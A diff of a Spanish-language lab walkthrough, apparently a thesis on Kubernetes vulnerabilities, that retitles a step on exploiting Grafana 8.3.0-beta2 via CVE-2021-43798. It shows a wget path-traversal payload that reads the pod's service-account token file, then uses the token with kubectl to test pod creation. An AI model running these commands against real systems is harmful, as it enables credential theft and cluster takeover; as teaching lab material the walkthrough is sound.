@@ -76,7 +76,9 @@ curl http://10.103.238.75:3000/login | grep version
 ```
 ![https://raw.githubusercontent.com/Alfesito/TFG-kubevuln/main/images/grafana_version.png](https://raw.githubusercontent.com/Alfesito/TFG-kubevuln/main/images/grafana_version.png)
 
-3. Buscamos posibles vectores de ataque. La versión de Grafana es la "8.3.0-beta2", la cual es vulnerable a LFI, es decir, podemos leer archivos del pod de Grafana. La vulnerabilidad esta clasificada con [CVE-2021-43798](https://www.exploit-db.com/exploits/50581). Aprovechando la vulnerabilidad de Grafana podemos leer el JWT del serviceaccount de Grafana, para ver si en este caso es posible crear pods con dicho token. Creamos una variable de entorno llamada token donde se encuentra el JWT del pod de Grafana.
+## Grafana Path Traversal
+
+1. Buscamos posibles vectores de ataque. La versión de Grafana es la "8.3.0-beta2", la cual es vulnerable a Path Traversal, es decir, podemos leer archivos del pod de Grafana. La vulnerabilidad esta clasificada con [CVE-2021-43798](https://www.exploit-db.com/exploits/50581). Aprovechando la vulnerabilidad de Grafana podemos leer el JWT del serviceaccount de Grafana, para ver si en este caso es posible crear pods con dicho token. Creamos una variable de entorno llamada token donde se encuentra el JWT del pod de Grafana.
 
 ``` bash 
 wget http://10.103.238.75:3000/public/plugins/alertGroups/../../../../../../../../var/run/secrets/kubernetes.io/serviceaccount/token
@@ -84,7 +86,7 @@ export token=$(cat token)
 ``` 
 ![https://raw.githubusercontent.com/Alfesito/TFG-kubevuln/main/images/token_env.png](https://raw.githubusercontent.com/Alfesito/TFG-kubevuln/main/images/token_env.png) 
 
-4. Comprobamos si el posible crear pods con el token de Grafana: 
+2. Comprobamos si el posible crear pods con el token de Grafana: 
 
 ``` bash 
 ./kubectl auth can-i create pods --token=$token
